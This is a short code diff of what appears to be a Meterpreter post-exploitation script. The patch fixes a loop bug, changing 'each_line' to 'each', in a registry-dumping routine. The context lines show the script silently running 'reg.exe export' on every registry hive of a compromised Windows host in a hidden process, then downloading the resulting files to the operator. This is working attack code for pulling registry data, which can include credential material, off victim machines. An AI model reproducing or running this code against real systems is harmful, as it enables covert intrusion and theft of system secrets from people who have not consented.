@@ -421,7 +421,7 @@ def regdump(pathoflogs,filename)
 	hives = %w{HKCU HKLM HKCC HKCR HKU}
 	windir = @client.fs.file.expand_path("%WinDir%")
 	print_status('Dumping and Downloading the Registry')
-	hives.each_line do |hive|
+	hives.each do |hive|
 		begin
 			print_status("\tExporting #{hive}")
 			r = @client.sys.process.execute("cmd.exe /c reg.exe export #{hive} #{windir}\\Temp\\#{hive}#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
@@ -443,7 +443,7 @@ def regdump(pathoflogs,filename)
 		end
 	end
 	#Downloading compressed registry Hives
-	hives.each_line do |hive|
+	hives.each do |hive|
 		begin
 			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
 			@client.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
